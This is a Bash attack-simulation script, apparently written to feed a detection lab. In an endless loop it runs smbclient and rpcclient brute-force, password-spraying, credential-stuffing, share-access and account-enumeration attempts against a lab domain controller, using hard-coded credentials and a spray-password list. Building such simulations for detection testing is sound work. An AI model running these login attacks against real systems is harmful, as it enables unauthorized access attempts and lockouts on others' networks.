#!/data/data/com.termux/files/usr/bin/bash

# ============================================================
# ThreatWeaver — Enhanced AD Attack Simulation (Termux)
# Covers: Brute Force, Credential Stuffing, Password Spraying,
#         Privilege Escalation, Lateral Movement, Kerberoasting,
#         Account Enumeration, Off-Hours Access, Service Abuse,
#         SMB Reconnaissance
# MITRE ATT&CK: T1110, T1078, T1021, T1059, T1558, T1087, T1018
# ============================================================

DC="192.168.40.10"
DOMAIN="PROJECT"

# --- Accounts ---
ADMIN_USER="Administrator"
ADMIN_PASS="Admin123#"
NORMAL_USER="testuser"
NORMAL_PASS="Akashsarkar2001#"
WRONG_PASS="WrongPassword123"

# --- Fake usernames for enumeration/spraying ---
FAKE_USERS=("admin" "backup_svc" "sqlservice" "helpdesk" "john.doe" "svc_account" "krbtgt" "guest")
SPRAY_PASSWORDS=("Spring2024!" "Password1" "Welcome123" "Company1!" "Qwerty123")

CYCLE=1

# ============================================================
# ATTACK FUNCTIONS
# ============================================================

# --------------------------------------------------
# 1. Classic Brute Force (MITRE T1110.001)
#    Generates: Event 4625 (failed logins) burst
#    Detection: brute_force_flag in ML engine
# --------------------------------------------------
simulate_brute_force() {
    echo "[*] [T1110.001] Brute Force — rapid failed logins for $NORMAL_USER..."
    for i in {1..12}; do
        smbclient -L //$DC -U "$DOMAIN/$NORMAL_USER%$WRONG_PASS" >/dev/null 2>&1
        sleep 0.3
    done
}

# --------------------------------------------------
# 2. Password Spraying (MITRE T1110.003)
#    Tries one password across many users
#    Detection: brute_force_flag (multiple users, failed logins)
# --------------------------------------------------
simulate_password_spray() {
    echo "[*] [T1110.003] Password Spraying — one password across multiple accounts..."
    local spray_pass="${SPRAY_PASSWORDS[$((RANDOM % ${#SPRAY_PASSWORDS[@]}))]}"
    for user in "${FAKE_USERS[@]}"; do
        smbclient -L //$DC -U "$DOMAIN/$user%$spray_pass" >/dev/null 2>&1
        sleep 0.5
    done
}

# --------------------------------------------------
# 3. Credential Stuffing (MITRE T1110.004)
#    Different user+pass combos in quick succession
#    Detection: brute_force_flag (multiple IPs/users, failed logins)
# --------------------------------------------------
simulate_credential_stuffing() {
    echo "[*] [T1110.004] Credential Stuffing — varied user/pass combos..."
    for i in {0..4}; do
        local user="${FAKE_USERS[$i]}"
        local pass="${SPRAY_PASSWORDS[$i]}"
        smbclient -L //$DC -U "$DOMAIN/$user%$pass" >/dev/null 2>&1
        sleep 0.4
    done
}

# --------------------------------------------------
# 4. Success After Failure (MITRE T1078)
#    Successful login immediately after burst of failures
#    Detection: privilege_escalation_flag
# --------------------------------------------------
simulate_success_after_fail() {
    echo "[*] [T1078] Success After Failure — login succeeds after brute force..."
    # Failed attempts first
    for i in {1..5}; do
        smbclient -L //$DC -U "$DOMAIN/$NORMAL_USER%$WRONG_PASS" >/dev/null 2>&1
    done
    sleep 1
    # Now succeed — triggers 4624 right after 4625 burst
    smbclient -L //$DC -U "$DOMAIN/$NORMAL_USER%$NORMAL_PASS" >/dev/null 2>&1
}

# --------------------------------------------------
# 5. Privileged Account Logon (MITRE T1078.002)
#    Direct admin login — generates Event 4672
#    Detection: privilege_escalation_flag
# --------------------------------------------------
simulate_privileged_logon() {
    echo "[*] [T1078.002] Privileged Logon — admin account access..."
    smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
}

# --------------------------------------------------
# 6. Lateral Movement — SMB Share Access (MITRE T1021.002)
#    Access multiple remote shares/services on DC
#    Detection: lateral_movement_flag (multiple machines)
# --------------------------------------------------
simulate_lateral_movement() {
    echo "[*] [T1021.002] Lateral Movement — accessing multiple SMB shares..."
    local shares=("IPC\$" "ADMIN\$" "C\$" "NETLOGON" "SYSVOL")
    for share in "${shares[@]}"; do
        smbclient //$DC/$share -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" -c "dir" >/dev/null 2>&1
        sleep 0.5
    done
}

# --------------------------------------------------
# 7. SMB Reconnaissance / Network Share Enumeration (MITRE T1018)
#    Enumerate available shares and hosts
#    Detection: lateral_movement_flag + anomaly via ML
# --------------------------------------------------
simulate_smb_recon() {
    echo "[*] [T1018] SMB Reconnaissance — enumerating shares and sessions..."
    # List shares
    smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
    # Attempt null session enumeration
    smbclient -L //$DC -N >/dev/null 2>&1
    # Try anonymous access
    smbclient -L //$DC -U "%" >/dev/null 2>&1
    # rpcclient enumeration
    if command -v rpcclient &>/dev/null; then
        rpcclient -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" $DC -c "enumdomusers" >/dev/null 2>&1
        rpcclient -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" $DC -c "enumdomgroups" >/dev/null 2>&1
    fi
}

# --------------------------------------------------
# 8. Account Enumeration (MITRE T1087.002)
#    Rapidly probe many usernames to discover valid accounts
#    Detection: brute_force_flag + ML anomaly (many unique users)
# --------------------------------------------------
simulate_account_enumeration() {
    echo "[*] [T1087.002] Account Enumeration — probing for valid accounts..."
    local probe_users=("administrator" "admin" "guest" "krbtgt" "testuser"
                       "backup" "svc_sql" "svc_web" "helpdesk" "user1"
                       "domain_admin" "exchange_svc" "print_svc" "ftp_user")
    for user in "${probe_users[@]}"; do
        smbclient -L //$DC -U "$DOMAIN/$user%probe" >/dev/null 2>&1
        sleep 0.2
    done
}

# --------------------------------------------------
# 9. Kerberoasting Prep (MITRE T1558.003)
#    Request TGS tickets for service accounts
#    Detection: generates Event 4769 (Kerberos Service Ticket)
# --------------------------------------------------
simulate_kerberoast_prep() {
    echo "[*] [T1558.003] Kerberoasting Prep — requesting service tickets..."
    local service_accounts=("sqlservice" "httpd_svc" "exchange_svc" "backup_svc" "iis_svc")
    for svc in "${service_accounts[@]}"; do
        # Each attempt generates authentication events against the DC
        smbclient -L //$DC -U "$DOMAIN/$svc%$WRONG_PASS" >/dev/null 2>&1
        sleep 0.3
    done
    # Also try with smbclient kinit-style if available
    if command -v kvno &>/dev/null; then
        kvno "cifs/$DC" >/dev/null 2>&1
    fi
}

# --------------------------------------------------
# 10. Off-Hours / Anomalous Time Access (ML Anomaly)
#     Login at unusual times triggers hour_deviation in ML
#     Detection: Isolation Forest anomaly (hour_deviation feature)
# --------------------------------------------------
simulate_offhours_access() {
    local current_hour=$(date +%H)
    echo "[*] [ML-Anomaly] Off-Hours Access — current hour: $current_hour..."
    echo "    (This generates login events timestamped at unusual hours)"
    # Rapid burst of logins — if run at night/odd hours, ML catches deviation
    for i in {1..4}; do
        smbclient -L //$DC -U "$DOMAIN/$ADMIN_USER%$ADMIN_PASS" >/dev/null 2>&1
        smbclient -L //$DC -U "$DOMAIN/$NORMAL_USER%$NORMAL_PASS" >/dev/null 2>&1
        sleep 0.5
    done
}

# --------------------------------------------------
# 11. Distributed Brute Force from Multiple Users (MITRE T1110)
#     Multiple accounts fail simultaneously — coordinated attack
#     Detection: brute_force_flag (multi-user, multi-IP correlation)
# --------------------------------------------------
simulate_distributed_brute() {
    echo "[*] [T1110] Distributed Brute Force — coordinated multi-user attack..."
    for user in "${FAKE_USERS[@]}"; do
        for i in {1..3}; do
            smbclient -L //$DC -U "$DOMAIN/$user%$WRONG_PASS" >/dev/null 2>&1
        done
        sleep 0.2
    done
}

# ============================================================
# MAIN LOOP
# ============================================================

echo "=============================================="
echo " ThreatWeaver Attack Simulator (Termux)"
echo " Target DC: $DC | Domain: $DOMAIN"
echo " 11 Attack Types | MITRE ATT&CK Mapped"
echo "=============================================="
echo ""

while true; do
    echo "=============================="
    echo " CYCLE $CYCLE — $(date '+%Y-%m-%d %H:%M:%S')"
    echo "=============================="

    simulate_brute_force
    sleep 2

    simulate_password_spray
    sleep 2

    simulate_credential_stuffing
    sleep 2

    simulate_success_after_fail
    sleep 2

    simulate_privileged_logon
    sleep 2

    simulate_lateral_movement
    sleep 2

    simulate_smb_recon
    sleep 2

    simulate_account_enumeration
    sleep 2

    simulate_kerberoast_prep
    sleep 2

    simulate_offhours_access
    sleep 2

    simulate_distributed_brute

    echo ""
    echo "[+] Cycle $CYCLE complete. All 11 attacks executed."
    echo "[+] Waiting 30 seconds before next cycle..."
    echo ""

    CYCLE=$((CYCLE + 1))
    sleep 30
done
